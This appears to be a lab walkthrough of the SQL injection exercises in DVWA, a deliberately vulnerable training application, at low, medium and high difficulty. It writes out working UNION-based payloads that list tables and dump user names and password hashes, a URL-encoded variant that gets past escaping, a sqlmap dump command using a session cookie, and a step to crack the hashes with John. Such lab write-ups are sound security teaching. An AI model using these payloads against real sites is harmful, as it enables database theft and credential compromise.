# SQL Injection - Low/Medium/High/Impossible


## Low/Medium/High

Using the other command injection we can find out the SQL version. For low difficulty, we can run `1' OR '1' = 1 #` to see the database. We can also dump, or execute other SQL statements. We can automate this with `sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=l8r5qn313r0pndajuv2thmh9k4" --dump -D mysql -T user"` but to do this without relying on tools.

```
1' and 1=1 union select null, table_name from information_schema.tables#    gives us information about the tables, table 'users' is the one of interests

1' and 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #  gets all columns of table users

1' and 1=1 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #    now we can use the columns to get the one of interest 'password'
```

All we do now is crack this using John as they are hashed. We put them in the format user:password, one for each line, in a text file.

On medium difficulty, it removes some characters `mysql_real_escape_string($id);` most notably the single quotes that we used for our exploitation. However, it still doesn't pose a problem, we can remove the single quote and it will still work fine. I ran Burp (or any HTTP interceptor tools like Tamper) and changed the parameter to `1%20and%201%3d0%20union%20select%20null,%20concat(first_name,0x0a,last_name,0x0a,user,0x0a,password)%20from%20users%20#`. Burp automatically encodes the space as html entities %20.

On high difficulty, we will try a slight variation of low:

```
1' and 1=1 union select null, table_name from information_schema.tables#    gives us information about the tables, table 'users' is the one of interests

1' and 1=1 union select null, column_name from information_schema.columns#

1' and 1=1 union select user, password from users#
```
